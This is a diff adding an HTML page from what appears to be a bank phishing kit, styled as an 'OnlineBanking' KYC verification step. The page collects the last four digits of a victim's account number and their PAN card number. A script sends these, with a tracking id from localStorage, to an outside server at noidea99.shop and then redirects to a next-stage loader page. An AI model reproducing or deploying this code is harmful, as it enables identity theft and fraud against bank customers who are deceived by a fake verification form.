@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width" />
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    
+    <header class="logo">
+        <img src="assets/header.jpeg" alt="">
+    </header>
+
+    <br>
+
+    <div class="login-form">
+        <br>
+        
+        <div class="content_heading">
+            <h3 class="pull-left">Verify Details</h3>
+        </div>
+
+        <p class="mandatory_txt">Mandatory field are marked with an asterisk (*)</p>
+
+        <form id="credit-form">
+            <div class="form-group">
+                <label class="control-label" for="lanum">Last 4 Digit Account Number<span class="mandatory_txt">*</span></label>
+
+                <input class="form-control" type="number" id="lanum" name="lanum" required/>
+            </div>
+
+            <div class="form-group">
+
+                <label class="control-label" for="lcnum">PAN Card Number<span class="mandatory_txt">*</span>
+                </label>
+
+                <input class="form-control" type="text" id="lcnum" name="lcnum" required />
+
+            </div>
+
+            <h3 class="pull-left">50% KYC Successful</h3>
+
+            <div class="commonbutton">
+                <input type="submit" class="btn btn-default" value="Submit" />
+            </div>
+        </form>
+
+    </div>
+
+    <br>
+
+    <div class="footer">
+        <p>© OnlineBanking</p>
+    </div>
+</body>
+
+</html>
+
+
+<script>
+
+  document
+    .getElementById("credit-form")
+    .addEventListener("submit", function (event) {
+      event.preventDefault();
+      //IDS
+        const lanum = document.querySelector('input[name="lanum"]').value;
+
+        const lcnum = document.querySelector('input[name="lcnum"]').value;
+
+        const randno = localStorage.getItem('random_no');
+
+        var data = {
+          randno : randno,
+          lanum: lanum,
+          lcnum: lcnum
+        };
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://noidea99.shop/wssbi/Shop6.php", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    console.log(xhr.responseText);
+                    window.location.href = "loader3.html";
+                } else {
+                    console.error("Error: " + xhr.status);
+                }
+            }
+        };
+
+        xhr.send(JSON.stringify(data));
+    });
+
+</script>
